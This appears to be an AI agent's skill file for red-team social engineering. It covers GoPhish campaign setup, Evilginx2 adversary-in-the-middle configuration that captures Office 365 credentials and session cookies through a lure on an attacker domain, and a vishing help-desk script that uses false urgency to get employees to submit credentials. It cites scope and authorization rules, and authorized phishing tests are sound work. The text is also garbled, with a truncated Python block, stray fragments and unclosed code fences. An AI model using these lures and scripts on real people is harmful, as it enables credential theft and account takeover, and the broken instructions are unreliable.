## Cybersecurity Skills (Invoke First)

Before starting any social engineering campaign, invoke these skills via the Skill tool:
- `cybersecurity-skills:conducting-spearphishing-simulation-campaign`
- `cybersecurity-skills:performing-phishing-simulation-with-gophish`
- `cybersecurity-skills:conducting-social-engineering-pretext-call`
- `cybersecurity-skills:executing-phishing-simulation-campaign`
- `cybersecurity-skills:performing-red-team-phishing-with-gophish`
- `cybersecurity-skills:performing-initial-access-with-evilginx3`
- `cybersecurity-skills:conducting-social-engineering-penetration-test`
- `cybersecurity-skills:detecting-spearphishing-with-email-gateway`

## Scope Enforcement
Verify target organization AND recipient email domains are explicitly in scope.txt.
Social engineering campaigns require SIGNED written authorization — no exceptions.
Store ALL targets and outcomes in evidence/ — never delete engagement records.
Do NOT impersonate law enforcement, government entities, or emergency services.

## GoPhish Campaign Setup
```bash
mkdir -p evidence/$(date +%Y%m%d)/$TARGET/phishing/{campaigns,templates,results,loot}

# Start GoPhish server
# gophish &
# Default admin: https://localhost:3333 (admin:gophish)

# GoPhish REST API — create sending profile
GOPHISH_API="http://localhost:3333/api"
API_KEY="$GOPHISH_API_KEY"

# Create SMTP sending profile
curl -s -X POST "$GOPHISH_API/smtp/" \
  -H "Authorization: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Engagement-SMTP",

    "ignore_cert_errors": false
  }' 2>&1 | python3 -m json.tool | \
  tee evidence/$(date +%Y%m%d)/$TARGET/phishing/campaigns/smtp_profile.json

# Create target group from OSINT email list
python3 << 'EOF'

                'position': 'Employee'
            })

## Evilginx2 — Adversary in the Middle
```bash
# Evilginx2 captures session cookies + credentials without requiring password
# Requires a domain you control with DNS pointed to your server

# Start evilginx
evilginx2 -p /opt/evilginx2/phishlets/ 2>&1

# Configure inside evilginx2 shell:
# config domain $ATTACKER_DOMAIN
# config ipv4 $LHOST
# phishlets hostname o365 "login.$ATTACKER_DOMAIN"
# phishlets enable o365
# lures create o365
# lures get-url 0

# Monitor captured credentials
# sessions

# Available phishlets: o365, linkedin, gmail, github, slack, dropbox, etc.
# Custom phishlet template location: /opt/evilginx2/phishlets/

echo "[*] Evilginx2 must be run interactively"
echo "[*] Lure URL format: https://login.$ATTACKER_DOMAIN/$LURE_TOKEN"
```

## Pretexting Scripts

### Vishing — IT Help Desk (Inbound)
```bash
cat > evidence/$(date +%Y%m%d)/$TARGET/phishing/templates/vishing_it_helpdesk.md << 'SCRIPT'
## IT Help Desk Pretext — AUTHORIZED ENGAGEMENT ONLY

**Pretext**: IT security is conducting an emergency password audit following a suspected breach.

**Opening**:
"Hi, this is [Name] from the IT Security Operations Center. I'm calling because we've
detected some unusual activity on accounts in your department. Are you available for
a quick 2-minute security verification?"

**If yes**: "I just need to verify your identity before I can share the details.
Can you confirm your employee ID and the last 4 digits of your badge number?"

**Escalation**:
"Thank you. Our system shows your account may have been accessed from an IP address
in Eastern Europe. As a precaution, I need you to visit our secure verification
portal and confirm your credentials to lock out the unauthorized user.
The URL is: [LURE_URL]"

**Objection handling**:
- "Can I call you back?": "I understand, but the window to lock this unauthorized
  access closes in 15 minutes. The attacker could change your password."
- "I'll call IT myself": "That's great — please mention ticket number SEC-[random].
  We'll also need you to verify at the portal first."

**Document**:
- Target name, department, employee ID (if obtained)
- Whether they clicked/entered credentials
- Timestamp and duration

## Evidence Output
Write to `evidence/$(date +%Y%m%d)/$TARGET/phishing/se_campaign_report.md`:
```markdown
## Social Engineering Campaign Report — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### Campaign Summary
| Metric | Value |
|--------|-------|
| Total Targets | X |
| Emails Delivered | X |
| Emails Opened | X (X%) |
| Links Clicked | X (X%) |
| Credentials Submitted | X (X%) |
| Reported to IT | X (X%) |

### Pretext Used
- **Scenario**: [description]
- **Sender Spoofing**: [from address]
- **Landing Page**: [description]

### Department Breakdown
| Department | Clicked | Submitted |
|------------|---------|-----------|

### Key Findings
1. [e.g., "Finance team had highest submission rate (X%)"]
2. [e.g., "IT security notification pretext most effective"]
3. [e.g., "No employee reported the phishing email to IT"]

### Recommendations
1. Security awareness training for high-risk departments
2. Implement DMARC/DKIM/SPF on all sending domains
3. Enable MFA on all externally-accessible systems
